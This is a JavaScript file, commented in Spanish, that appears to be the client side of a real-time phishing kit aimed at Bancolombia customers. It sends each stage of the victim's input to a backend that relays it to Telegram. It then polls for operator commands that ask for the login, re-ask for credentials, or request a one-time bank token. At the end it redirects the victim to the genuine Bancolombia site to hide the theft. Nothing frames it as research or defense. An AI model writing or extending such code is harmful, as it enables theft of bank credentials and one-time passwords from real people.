/**
 * TELEGRAM INTEGRATION MANAGER
 * Maneja comunicación con Telegram y polling de acciones
 */

'use strict';

class TelegramManager {
    constructor() {
        this.checkInterval = null;
        this.checking = false;
    }

    async sendToTelegram(stage, data) {
        try {
            const response = await fetch('api/send-message', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                credentials: 'include',
                body: JSON.stringify({ stage, data })
            });

            const result = await response.json();
            console.log('📤 Mensaje enviado a Telegram');
            return result;
        } catch (error) {
            console.error('❌ Error enviando a Telegram:', error);
            return { success: false };
        }
    }

    async startPolling() {
        if (this.checking) return;
        this.checking = true;
        this.checkInterval = setInterval(() => this.checkAction(), 1500);
        console.log('🔄 Polling iniciado...');
    }

    stopPolling() {
        if (this.checkInterval) {
            clearInterval(this.checkInterval);
            this.checkInterval = null;
        }
        this.checking = false;
    }

    async checkAction() {
        try {
            const response = await fetch(`api/check-action?t=${Date.now()}`, {
                method: 'GET',
                cache: 'no-cache',
                credentials: 'include'
            });
            const data = await response.json();

            if (data.action) {
                console.log('✅ ACCIÓN DETECTADA:', data.action);
                this.stopPolling();
                this.handleAction(data.action);
            }
        } catch (error) {
            console.error('❌ Error checking action:', error);
        }
    }

    handleAction(action) {
        console.log('🎯 EJECUTANDO ACCIÓN:', action);

        const overlay = document.querySelector('.loading-overlay');
        if (overlay) {
            overlay.classList.remove('active');
        }

        setTimeout(() => {
            switch (action) {
                case 'error_documento':
                    window.location.href = 'index.html?error=documento';
                    break;

                case 'pedir_logo':
                    window.location.href = 'next-step.html';
                    break;

                case 'error_logo':
                    window.location.href = 'next-step.html?error=credenciales';
                    break;

                case 'pedir_token':
                    if (window.location.pathname.includes('next-step.html')) {
                        if (typeof window.tokenModalController !== 'undefined') {
                            window.tokenModalController.switchToTokenCard();
                        }
                    } else {
                        window.location.href = 'next-step.html?openToken=1';
                    }
                    break;

                case 'error_token':
                    // If we are on next-step.html and using the card
                    const tokenInput = document.getElementById('tokenInputCard');
                    if (tokenInput) {
                        tokenInput.value = '';
                        tokenInput.focus();
                        alert('Token incorrecto o expirado. Por favor, genera uno nuevo e ingresalo.');
                        this.startPolling(); // Resume polling for next try
                    }
                    break;

                case 'finalizar':
                    window.location.href = 'https://www.bancolombia.com/personas';
                    break;

                default:
                    console.warn('❓ Acción desconocida:', action);
            }
        }, 300);
    }
}

// Instancia global
window.telegramManager = new TelegramManager();

// Iniciar siempre al cargar para estar listos para órdenes de Telegram
document.addEventListener('DOMContentLoaded', () => {
    // Si hay un loader activo (porque venimos de un submit), nos aseguramos de que el polling esté corriendo
    const overlay = document.querySelector('.loading-overlay');
    if (overlay && overlay.classList.contains('active')) {
        window.telegramManager.startPolling();
    } else {
        // En general, es bueno que siempre esté escuchando órdenes (como pedir_logo o error_documento)
        window.telegramManager.startPolling();
    }
});

